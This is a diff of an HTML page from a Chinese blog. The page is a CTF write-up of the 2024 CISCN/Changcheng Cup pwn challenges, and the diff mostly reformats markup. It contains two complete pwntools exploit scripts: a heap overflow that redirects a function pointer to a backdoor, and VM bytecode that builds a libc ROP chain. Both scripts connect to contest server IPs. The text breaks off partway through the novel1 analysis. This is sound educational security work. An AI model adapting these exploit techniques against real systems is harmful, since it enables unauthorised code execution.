@@ -18,12 +18,12 @@
     <meta name="googlebot" content="index,follow">
     <meta name="revisit-after" content="1 days">
     
-        <meta name="description" content="pwn-anote32位程序，存在后门函数。  粗测一下功能，add没有我们可以控制的输入；edit可以往里写内容，并且最后会显示work done；show能够看chunk里的内容，而且还送了gift，也就是堆上的地址。然后由于程序是c++编写的，直接看反编译的代码会比较模糊，这里结合动态调试分析功能点。   这里每次add时都会申请一个0x20大小的chunk，其中data域第一个会填入一个函">
+        <meta name="description" content="pwn-anote 32位程序，存在后门函数。  粗测一下功能，add没有我们可以控制的输入；edit可以往里写内容，并且最后会显示work done；show能够看chunk里的内容，而且还送了gift，也就是堆上的地址。然后由于程序是c++编写的，直接看反编译的代码会比较模糊，这里结合动态调试分析功能点。   这里每次add时都会申请一个0x20大小的chunk，其中data域第">
 <meta property="og:type" content="article">
 <meta property="og:title" content="2024ciscn&amp;长城杯初赛pwn方向部分题解">
 <meta property="og:url" content="https://collectcrop.github.io/blog/2024/12/18/2024ciscn-%E9%95%BF%E5%9F%8E%E6%9D%AF%E5%88%9D%E8%B5%9Bpwn%E6%96%B9%E5%90%91%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/index.html">
 <meta property="og:site_name" content="Collectcrop&#39;s Blog">
-<meta property="og:description" content="pwn-anote32位程序，存在后门函数。  粗测一下功能，add没有我们可以控制的输入；edit可以往里写内容，并且最后会显示work done；show能够看chunk里的内容，而且还送了gift，也就是堆上的地址。然后由于程序是c++编写的，直接看反编译的代码会比较模糊，这里结合动态调试分析功能点。   这里每次add时都会申请一个0x20大小的chunk，其中data域第一个会填入一个函">
+<meta property="og:description" content="pwn-anote 32位程序，存在后门函数。  粗测一下功能，add没有我们可以控制的输入；edit可以往里写内容，并且最后会显示work done；show能够看chunk里的内容，而且还送了gift，也就是堆上的地址。然后由于程序是c++编写的，直接看反编译的代码会比较模糊，这里结合动态调试分析功能点。   这里每次add时都会申请一个0x20大小的chunk，其中data域第">
 <meta property="og:locale" content="zh_CN">
 <meta property="og:image" content="https://collectcrop.github.io/blog/2024/12/18/2024ciscn-%E9%95%BF%E5%9F%8E%E6%9D%AF%E5%88%9D%E8%B5%9Bpwn%E6%96%B9%E5%90%91%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/image-20241215182951906.png">
 <meta property="og:image" content="https://collectcrop.github.io/blog/2024/12/18/2024ciscn-%E9%95%BF%E5%9F%8E%E6%9D%AF%E5%88%9D%E8%B5%9Bpwn%E6%96%B9%E5%90%91%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/image-20241215183554444.png">
@@ -148,7 +148,11 @@
     
     
     
-<meta name="generator" content="Hexo 7.3.0"></head>
+<!-- hexo injector head_end start -->
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.12.0/dist/katex.min.css">
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/hexo-math@4.0.0/dist/style.css">
+<!-- hexo injector head_end end --><meta name="generator" content="Hexo 7.3.0"></head>
 
 
 
@@ -709,14 +713,16 @@
 
 
 		<div class="article-content markdown-body px-2 sm:px-6 md:px-8 pb-8">
-			<h4 id="pwn-anote"><a href="#pwn-anote" class="headerlink" title="pwn-anote"></a>pwn-anote</h4><p>32位程序，存在后门函数。</p>
+			<h4 id="pwn-anote">pwn-anote</h4>
+<p>32位程序，存在后门函数。</p>
 <img  
                      lazyload
                      src="/images/loading.svg"
                      data-src="/blog/2024/12/18/2024ciscn-%E9%95%BF%E5%9F%8E%E6%9D%AF%E5%88%9D%E8%B5%9Bpwn%E6%96%B9%E5%90%91%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/image-20241215182951906.png"
                       class=""
                 >
-<p>粗测一下功能，add没有我们可以控制的输入；edit可以往里写内容，并且最后会显示work done；show能够看chunk里的内容，而且还送了gift，也就是堆上的地址。然后由于程序是c++编写的，直接看反编译的代码会比较模糊，这里结合动态调试分析功能点。</p>
+<p>粗测一下功能，add没有我们可以控制的输入；edit可以往里写内容，并且最后会显示work
+done；show能够看chunk里的内容，而且还送了gift，也就是堆上的地址。然后由于程序是c++编写的，直接看反编译的代码会比较模糊，这里结合动态调试分析功能点。</p>
 <img  
                      lazyload
                      src="/images/loading.svg"
@@ -762,7 +768,8 @@
                       class=""
                 >
 <div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&quot;i386&quot;</span>,log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line"><span class="comment"># p = process(&quot;./note&quot;)</span></span><br><span class="line">p = remote(<span class="string">&quot;47.95.214.102&quot;</span>,<span class="number">20609</span>)</span><br><span class="line">context.terminal=[<span class="string">&quot;cmd.exe&quot;</span>,<span class="string">&quot;/c&quot;</span>, <span class="string">&quot;start&quot;</span>, <span class="string">&quot;cmd.exe&quot;</span>, <span class="string">&quot;/c&quot;</span>, <span class="string">&quot;wsl.exe&quot;</span>, <span class="string">&quot;-e&quot;</span>]</span><br><span class="line">backdoor = <span class="number">0x80489CE</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>():       <span class="comment">#max 9</span></span><br><span class="line">    p.sendlineafter(<span class="string">&quot;&gt;&gt;&quot;</span>,<span class="string">b&quot;1&quot;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">idx</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;&gt;&gt;&quot;</span>,<span class="string">b&quot;2&quot;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;index:&quot;</span>,<span class="built_in">str</span>(idx).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idx,size,content</span>):     <span class="comment">#size&lt;40,触发函数指针</span></span><br><span class="line">    p.sendlineafter(<span class="string">&quot;&gt;&gt;&quot;</span>,<span class="string">b&quot;3&quot;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;index:&quot;</span>,<span class="built_in">str</span>(idx).encode())</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;len&quot;</span>,<span class="built_in">str</span>(size).encode())</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;content:&quot;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">end</span>():</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;&gt;&gt;&quot;</span>,<span class="string">b&quot;4&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_addr</span>(<span class="params">p</span>):</span><br><span class="line">    <span class="keyword">return</span> u64(p.recvuntil(<span class="string">b&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line"></span><br><span class="line">add()</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;gift: &quot;</span>)</span><br><span class="line">heap_base = <span class="built_in">int</span>(p.recv(<span class="number">9</span>),<span class="number">16</span>)-<span class="number">0x5fc8</span></span><br><span class="line">log.success(<span class="string">&quot;heap_base: &quot;</span>+<span class="built_in">hex</span>(heap_base))</span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(p)</span></span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">add()</span><br><span class="line">edit(<span class="number">0</span>,<span class="number">28</span>,p32(backdoor)*<span class="number">5</span>+p32(<span class="number">0x21</span>)+p32(heap_base+<span class="number">0x5fd0</span>))</span><br><span class="line">edit(<span class="number">1</span>,<span class="number">10</span>,<span class="string">b&quot;abcd&quot;</span>)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
-<h4 id="pwn-avm"><a href="#pwn-avm" class="headerlink" title="pwn-avm"></a>pwn-avm</h4><p>VMpwn，首先要逆出其中每个指令的含义，以及自定义指令的构成。</p>
+<h4 id="pwn-avm">pwn-avm</h4>
+<p>VMpwn，首先要逆出其中每个指令的含义，以及自定义指令的构成。</p>
 <p>首先主函数可以读取0x300字节的输入，然后进initial函数进行初始化。具体是往opt+0x100地址之后填一些控制信息，然后再把前面的位置都置空。</p>
 <img  
                      lazyload
@@ -871,7 +878,8 @@
                       class=""
                 >
 <div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> ctypes</span><br><span class="line">context(arch=<span class="string">&quot;amd64&quot;</span>,log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line">context.terminal=[<span class="string">&quot;cmd.exe&quot;</span>,<span class="string">&quot;/c&quot;</span>, <span class="string">&quot;start&quot;</span>, <span class="string">&quot;cmd.exe&quot;</span>, <span class="string">&quot;/c&quot;</span>, <span class="string">&quot;wsl.exe&quot;</span>, <span class="string">&quot;-e&quot;</span>]</span><br><span class="line"><span class="comment"># 0x300大小限制</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#    len    func</span></span><br><span class="line"><span class="comment"># 1   4      add</span></span><br><span class="line"><span class="comment"># 2   4      sub</span></span><br><span class="line"><span class="comment"># 3   4      mul</span></span><br><span class="line"><span class="comment"># 4   4      div</span></span><br><span class="line"><span class="comment"># 5   4      xor</span></span><br><span class="line"><span class="comment"># 6   4      and</span></span><br><span class="line"><span class="comment"># 7   4      shl</span></span><br><span class="line"><span class="comment"># 8   4      shr</span></span><br><span class="line"><span class="comment"># 9   4     write_stack</span></span><br><span class="line"><span class="comment"># 10  4     write_reg</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">savereg,reg1,reg2</span>):</span><br><span class="line">    payload = p32((<span class="number">1</span>&lt;&lt;<span class="number">0x1c</span>)+(savereg&amp;<span class="number">0x1f</span>)+((reg1&amp;<span class="number">0x1f</span>)&lt;&lt;<span class="number">5</span>)+((reg2&amp;<span class="number">0x1f</span>)&lt;&lt;<span class="number">16</span>))</span><br><span class="line">    <span class="keyword">return</span> payload</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sub</span>(<span class="params">savereg,reg1,reg2</span>):</span><br><span class="line">    payload = p32((<span class="number">2</span>&lt;&lt;<span class="number">0x1c</span>)+(savereg&amp;<span class="number">0x1f</span>)+((reg1&amp;<span class="number">0x1f</span>)&lt;&lt;<span class="number">5</span>)+((reg2&amp;<span class="number">0x1f</span>)&lt;&lt;<span class="number">16</span>))</span><br><span class="line">    <span class="keyword">return</span> payload</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">mul</span>(<span class="params">savereg,reg1,reg2</span>):</span><br><span class="line">    payload = p32((<span class="number">3</span>&lt;&lt;<span class="number">0x1c</span>)+(savereg&amp;<span class="number">0x1f</span>)+((reg1&amp;<span class="number">0x1f</span>)&lt;&lt;<span class="number">5</span>)+((reg2&amp;<span class="number">0x1f</span>)&lt;&lt;<span class="number">16</span>))</span><br><span class="line">    <span class="keyword">return</span> payload</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">div</span>(<span class="params">savereg,reg1,reg2</span>):</span><br><span class="line">    payload = p32((<span class="number">4</span>&lt;&lt;<span class="number">0x1c</span>)+(savereg&amp;<span class="number">0x1f</span>)+((reg1&amp;<span class="number">0x1f</span>)&lt;&lt;<span class="number">5</span>)+((reg2&amp;<span class="number">0x1f</span>)&lt;&lt;<span class="number">16</span>))</span><br><span class="line">    <span class="keyword">return</span> payload</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">xor</span>(<span class="params">savereg,reg1,reg2</span>):</span><br><span class="line">    payload = p32((<span class="number">5</span>&lt;&lt;<span class="number">0x1c</span>)+(savereg&amp;<span class="number">0x1f</span>)+((reg1&amp;<span class="number">0x1f</span>)&lt;&lt;<span class="number">5</span>)+((reg2&amp;<span class="number">0x1f</span>)&lt;&lt;<span class="number">16</span>))</span><br><span class="line">    <span class="keyword">return</span> payload</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">and_</span>(<span class="params">savereg,reg1,reg2</span>):</span><br><span class="line">    payload = p32((<span class="number">6</span>&lt;&lt;<span class="number">0x1c</span>)+(savereg&amp;<span class="number">0x1f</span>)+((reg1&amp;<span class="number">0x1f</span>)&lt;&lt;<span class="number">5</span>)+((reg2&amp;<span class="number">0x1f</span>)&lt;&lt;<span class="number">16</span>))</span><br><span class="line">    <span class="keyword">return</span> payload</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">shl</span>(<span class="params">savereg,reg1,reg2</span>):</span><br><span class="line">    payload = p32((<span class="number">7</span>&lt;&lt;<span class="number">0x1c</span>)+(savereg&amp;<span class="number">0x1f</span>)+((reg1&amp;<span class="number">0x1f</span>)&lt;&lt;<span class="number">5</span>)+((reg2&amp;<span class="number">0x1f</span>)&lt;&lt;<span class="number">16</span>))</span><br><span class="line">    <span class="keyword">return</span> payload</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">shr</span>(<span class="params">savereg,reg1,reg2</span>):</span><br><span class="line">    payload = p32((<span class="number">8</span>&lt;&lt;<span class="number">0x1c</span>)+(savereg&amp;<span class="number">0x1f</span>)+((reg1&amp;<span class="number">0x1f</span>)&lt;&lt;<span class="number">5</span>)+((reg2&amp;<span class="number">0x1f</span>)&lt;&lt;<span class="number">16</span>))</span><br><span class="line">    <span class="keyword">return</span> payload</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">write_stack</span>(<span class="params">tarreg,reg1,num</span>):</span><br><span class="line">    payload = p32((<span class="number">9</span>&lt;&lt;<span class="number">0x1c</span>)+(tarreg&amp;<span class="number">0x1f</span>)+((reg1&amp;<span class="number">0x1f</span>)&lt;&lt;<span class="number">5</span>)+((num&amp;<span class="number">0xfff</span>)&lt;&lt;<span class="number">16</span>))</span><br><span class="line">    <span class="keyword">return</span> payload</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">write_reg</span>(<span class="params">tarreg,reg1,num</span>):</span><br><span class="line">     payload = p32((<span class="number">10</span>&lt;&lt;<span class="number">0x1c</span>)+(tarreg&amp;<span class="number">0x1f</span>)+((reg1&amp;<span class="number">0x1f</span>)&lt;&lt;<span class="number">5</span>)+((num&amp;<span class="number">0xfff</span>)&lt;&lt;<span class="number">16</span>))</span><br><span class="line">     <span class="keyword">return</span> payload</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">make_addr</span>(<span class="params">offset,tar</span>):</span><br><span class="line">    binary = <span class="built_in">bin</span>(offset)[<span class="number">2</span>:][::-<span class="number">1</span>]</span><br><span class="line">    payload = add(tar,<span class="number">31</span>,<span class="number">31</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(binary)):</span><br><span class="line">        <span class="keyword">if</span> binary[i]==<span class="string">&quot;1&quot;</span>:</span><br><span class="line">            payload += add(tar,tar,i)</span><br><span class="line">    <span class="keyword">return</span> payload</span><br><span class="line">    </span><br><span class="line"><span class="comment"># p = process(&quot;./pwn&quot;)</span></span><br><span class="line">p = remote(<span class="string">&quot;47.94.202.237&quot;</span>,<span class="number">36894</span>)</span><br><span class="line"><span class="comment">#-0x29d90</span></span><br><span class="line">payload =  write_reg(<span class="number">25</span>,<span class="number">0</span>,<span class="number">0xd38</span>) + write_reg(<span class="number">0</span>,<span class="number">31</span>,<span class="number">0xd30</span>)+add(<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>)+add(<span class="number">2</span>,<span class="number">1</span>,<span class="number">1</span>)+add(<span class="number">3</span>,<span class="number">2</span>,<span class="number">2</span>)+add(<span class="number">4</span>,<span class="number">3</span>,<span class="number">3</span>)+add(<span class="number">5</span>,<span class="number">4</span>,<span class="number">4</span>)+add(<span class="number">6</span>,<span class="number">5</span>,<span class="number">5</span>)</span><br><span class="line">payload += add(<span class="number">7</span>,<span class="number">6</span>,<span class="number">6</span>)+add(<span class="number">8</span>,<span class="number">7</span>,<span class="number">7</span>)+add(<span class="number">9</span>,<span class="number">8</span>,<span class="number">8</span>)+add(<span class="number">10</span>,<span class="number">9</span>,<span class="number">9</span>)+add(<span class="number">11</span>,<span class="number">10</span>,<span class="number">10</span>)+add(<span class="number">12</span>,<span class="number">11</span>,<span class="number">11</span>)+add(<span class="number">13</span>,<span class="number">12</span>,<span class="number">12</span>)+add(<span class="number">14</span>,<span class="number">13</span>,<span class="number">13</span>)+add(<span class="number">15</span>,<span class="number">14</span>,<span class="number">14</span>)</span><br><span class="line">payload += add(<span class="number">16</span>,<span class="number">15</span>,<span class="number">15</span>)+add(<span class="number">17</span>,<span class="number">16</span>,<span class="number">16</span>)+add(<span class="number">18</span>,<span class="number">17</span>,<span class="number">17</span>)+add(<span class="number">19</span>,<span class="number">18</span>,<span class="number">18</span>)+add(<span class="number">20</span>,<span class="number">19</span>,<span class="number">19</span>)+add(<span class="number">21</span>,<span class="number">20</span>,<span class="number">20</span>)+add(<span class="number">22</span>,<span class="number">21</span>,<span class="number">21</span>)+add(<span class="number">23</span>,<span class="number">22</span>,<span class="number">22</span>)</span><br><span class="line">payload += make_addr(<span class="number">0x29d90</span>,<span class="number">24</span>)</span><br><span class="line">payload += sub(<span class="number">25</span>,<span class="number">25</span>,<span class="number">24</span>)</span><br><span class="line">payload += make_addr(<span class="number">0x29139</span>,<span class="number">24</span>) + add(<span class="number">29</span>,<span class="number">24</span>,<span class="number">25</span>) + write_stack(<span class="number">29</span>,<span class="number">31</span>,<span class="number">0x118</span>) </span><br><span class="line">payload += make_addr(<span class="number">0x2a3e5</span>,<span class="number">24</span>) + add(<span class="number">26</span>,<span class="number">24</span>,<span class="number">25</span>) + write_stack(<span class="number">26</span>,<span class="number">31</span>,<span class="number">0x120</span>) </span><br><span class="line">payload += make_addr(<span class="number">0x1d8678</span>,<span class="number">24</span>) + add(<span class="number">27</span>,<span class="number">24</span>,<span class="number">25</span>) + write_stack(<span class="number">27</span>,<span class="number">31</span>,<span class="number">0x128</span>)</span><br><span class="line">payload += make_addr(<span class="number">0x50D70</span>,<span class="number">24</span>) + add(<span class="number">28</span>,<span class="number">24</span>,<span class="number">25</span>) + write_stack(<span class="number">28</span>,<span class="number">31</span>,<span class="number">0x130</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#write_reg(15,0,0xd20)  0x1000</span></span><br><span class="line"><span class="comment"># +write_reg(1,0,0x118)+write_reg(2,0,0x100)+write_reg(3,0,0xd38)+sub(4,1,2)+mul(5,4,4)</span></span><br><span class="line"><span class="comment"># payload += mul(5,5,17)*5 + sub(5,5,15)*6</span></span><br><span class="line">log.info(<span class="built_in">hex</span>(<span class="built_in">len</span>(payload)))</span><br><span class="line"><span class="comment"># gdb.attach(p)</span></span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">p.sendafter(<span class="string">&quot;opcode:&quot;</span>,payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></div>
-<h4 id="pwn-novel1"><a href="#pwn-novel1" class="headerlink" title="pwn-novel1"></a>pwn-novel1</h4><p>C++编译出来的一个二进制文件，直接IDA静态分析有点头大，先运行看看大致功能。</p>
+<h4 id="pwn-novel1">pwn-novel1</h4>
+<p>C++编译出来的一个二进制文件，直接IDA静态分析有点头大，先运行看看大致功能。</p>
 <p>首先会让我们输入Author的名字，然后有两种选项可供选择。第一个选项会让我们输入Blood和Evidence，其中Blood是一个序号，且不能多次设置同一个Blood位置；Evidence看不出来是干什么的，但是会发现字母是不行的，可以输入数字。根据命名bloodstain（血迹），以及Evidence（线索），我们先猜测是跟着某种线索寻找血迹。</p>
 <img  
                      lazyload
@@ -894,8 +902,11 @@
                 >
 <p>之后还是得看静态反汇编出的代码，这里的unordered_map实际上c++的一个模板类，其具体函数的作用其实我们能够查到。常用函数如下。就功能而言，unordered_map类似于python中的字典类型，提供一个键值对的映射。</p>
 <p><strong>1. 构造与初始化</strong></p>
-<div class="table-container">
 <table>
+<colgroup>
+<col style="width: 38%" />
+<col style="width: 61%" />
+</colgroup>
 <thead>
 <tr>
 <th>函数名</th>
@@ -917,7 +928,8 @@
 </tr>
 <tr>
 <td><code>unordered_map(other)</code></td>
-<td>拷贝构造函数，用另一个 <code>unordered_map</code> 初始化本对象。</td>
+<td>拷贝构造函数，用另一个 <code>unordered_map</code>
+初始化本对象。</td>
 </tr>
 <tr>
 <td><code>unordered_map(other, std::move)</code></td>
@@ -925,11 +937,13 @@
 </tr>
 </tbody>
 </table>
-</div>
-<hr>
+<hr />
 <p><strong>2. 插入与更新元素</strong></p>
-<div class="table-container">
 <table>
+<colgroup>
+<col style="width: 37%" />
+<col style="width: 62%" />
+</colgroup>
 <thead>
 <tr>
 <th>函数名</th>
@@ -955,11 +969,13 @@
 </tr>
 <tr>
 <td><code>operator[key]</code></td>
-<td>通过 <code>[]</code> 访问元素，若键不存在则插入新键并返回默认值。</td>
+<td>通过 <code>[]</code>
+访问元素，若键不存在则插入新键并返回默认值。</td>
 </tr>
 <tr>
 <td><code>at(key)</code></td>
-<td>访问元素，若键不存在则抛出 <code>std::out_of_range</code> 异常。</td>
+<td>访问元素，若键不存在则抛出 <code>std::out_of_range</code>
+异常。</td>
 </tr>
 <tr>
 <td><code>try_emplace(key, args...)</code></td>
@@ -967,11 +983,13 @@
 </tr>
 </tbody>
 </table>
-</div>
-<hr>
+<hr />
 <p><strong>3. 删除元素</strong></p>
-<div class="table-container">
 <table>
+<colgroup>
+<col style="width: 28%" />
+<col style="width: 71%" />
+</colgroup>
 <thead>
 <tr>
 <th>函数名</th>
@@ -997,11 +1015,13 @@
 </tr>
 </tbody>
 </table>
-</div>
-<hr>
+<hr />
 <p><strong>4. 查找元素</strong></p>
-<div class="table-container">
 <table>
+<colgroup>
+<col style="width: 23%" />
+<col style="width: 76%" />
+</colgroup>
 <thead>
 <tr>
 <th>函数名</th>
@@ -1015,11 +1035,13 @@
 </tr>
 <tr>
 <td><code>contains(key)</code></td>
-<td>检查容器是否包含某个键，返回 <code>true</code> 或 <code>false</code>。</td>
+<td>检查容器是否包含某个键，返回 <code>true</code> 或
+<code>false</code>。</td>
 </tr>
 <tr>
 <td><code>count(key)</code></td>
-<td>返回指定键出现的次数（对于 <code>unordered_map</code> 始终为 0 或 1）。</td>
+<td>返回指定键出现的次数（对于 <code>unordered_map</code> 始终为 0 或
+1）。</td>
 </tr>
 <tr>
 <td><code>equal_range(key)</code></td>
@@ -1027,10 +1049,8 @@
 </tr>
 </tbody>
 </table>
-</div>
-<hr>
+<hr />
 <p><strong>5. 容量相关</strong></p>
-<div class="table-container">
 <table>
 <thead>
 <tr>
@@ -1041,7 +1061,8 @@
 <tbody>
 <tr>
 <td><code>empty()</code></td>
-<td>检查容器是否为空，返回 <code>true</code> 或 <code>false</code>。</td>
+<td>检查容器是否为空，返回 <code>true</code> 或
+<code>false</code>。</td>
 </tr>
 <tr>
 <td><code>size()</code></td>
@@ -1053,11 +1074,13 @@
 </tr>
 </tbody>
 </table>
-</div>
-<hr>
+<hr />
 <p><strong>6. 哈希表相关</strong></p>
-<div class="table-container">
 <table>
+<colgroup>
+<col style="width: 31%" />
+<col style="width: 68%" />
+</colgroup>
 <thead>
 <tr>
 <th>函数名</th>
@@ -1091,7 +1114,8 @@
 </tr>
 <tr>
 <td><code>reserve(n)</code></td>
-<td>预留足够的空间，调整桶数量使容器能存储至少 <code>n</code> 个元素。</td>
+<td>预留足够的空间，调整桶数量使容器能存储至少 <code>n</code>
+个元素。</td>
 </tr>
 <tr>
 <td><code>hash_function()</code></td>
@@ -1103,10 +1127,8 @@
 </tr>
 </tbody>
 </table>
-</div>
-<hr>
+<hr />
 <p><strong>7. 迭代器相关</strong></p>
-<div class="table-container">
 <table>
 <thead>
 <tr>
@@ -1141,10 +1163,8 @@
 </tr>
 </tbody>
 </table>
-</div>
-<hr>
+<hr />
 <p><strong>8. 比较两个 unordered_map</strong></p>
-<div class="table-container">
 <table>
 <thead>
 <tr>
@@ -1163,8 +1183,9 @@
 </tr>
 </tbody>
 </table>
-</div>
-<p>那么我们先看part1的功能，首先<strong>bloodstains</strong>是一个模板类，其键为unsigned int类型，值为unsigned long类型。然后这个模板类中不能含有超过31个键值对，否则会调用fragment退出。而且后面通过find寻找我们输入的键，如果找到就退出，说明限制了不能有相同的键。最后对result的两次操作会为键值对赋值。</p>
+<p>那么我们先看part1的功能，首先<strong>bloodstains</strong>是一个模板类，其键为unsigned
+int类型，值为unsigned
+long类型。然后这个模板类中不能含有超过31个键值对，否则会调用fragment退出。而且后面通过find寻找我们输入的键，如果找到就退出，说明限制了不能有相同的键。最后对result的两次操作会为键值对赋值。</p>
 <img  
                      lazyload
                      src="/images/loading.svg"
@@ -1179,48 +1200,60 @@
                       class=""
                 >
 <p><strong>1. 桶的管理机制</strong></p>
-<ol>
-<li><strong>哈希函数与桶的分布</strong>:<ul>
-<li><code>unordered_map</code> 使用 <strong>哈希函数</strong> 对键 (key) 进行散列，计算哈希值。</li>
-<li>通过以下公式确定键值对存储的桶索引： $bucket\ index=hash(key) \%bucket\ count$</li>
-<li><code>bucket_count</code> 是当前的桶数量（可以随装载因子（load factor）变化自动调整）。</li>
-</ul>
-</li>
-<li><strong>桶的内部结构</strong>:<ul>
+<ol type="1">
+<li><strong>哈希函数与桶的分布</strong>:
+<ul>
+<li><code>unordered_map</code> 使用 <strong>哈希函数</strong> 对键 (key)
+进行散列，计算哈希值。</li>
+<li>通过以下公式确定键值对存储的桶索引： <span
+class="math inline">\(bucket\ index=hash(key) \%bucket\
+count\)</span></li>
+<li><code>bucket_count</code> 是当前的桶数量（可以随装载因子（load
+factor）变化自动调整）。</li>
+</ul></li>
+<li><strong>桶的内部结构</strong>:
+<ul>
 <li>每个桶可能存储多个键值对，冲突的键值对以链表或其他数据结构（如树）存储在同一桶中。</li>
-<li>冲突（collision）发生时，<code>unordered_map</code> 使用 <strong>开放地址法</strong> 或 <strong>分离链法</strong> 等策略来解决。</li>
-</ul>
-</li>
-<li><strong>装载因子与桶重分配</strong>:<ul>
-<li>装载因子 (Load Factor)：表示哈希表的密度，公式为：$\text{load factor} = \frac{\text{size}}{\text{bucket count}}$</li>
-<li>如果装载因子超出预设值，<code>unordered_map</code> 会自动 <strong>增大桶的数量</strong>（通常翻倍），并重新分配键值对以减少冲突。</li>
-</ul>
-</li>
+<li>冲突（collision）发生时，<code>unordered_map</code> 使用
+<strong>开放地址法</strong> 或 <strong>分离链法</strong>
+等策略来解决。</li>
+</ul></li>
+<li><strong>装载因子与桶重分配</strong>:
+<ul>
+<li>装载因子 (Load Factor)：表示哈希表的密度，公式为：<span
